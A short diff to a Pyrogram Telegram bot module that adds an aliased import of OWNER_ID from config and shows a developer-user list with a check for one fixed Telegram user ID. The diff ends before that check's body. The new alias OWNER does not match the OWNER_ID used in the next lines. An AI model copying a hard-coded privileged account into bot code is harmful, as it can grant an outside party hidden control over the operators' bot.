@@ -2,7 +2,7 @@ from pyrogram import Client, filters
 from ..Database.users import get_user
 from ..Database.chats import get_chat
 from ..universal_decorator import YxH
-
+from config import OWNER_ID as OWNER
 
 DEV_USERS = [OWNER_ID]
 if not 1965472544 in DEV_USERS:
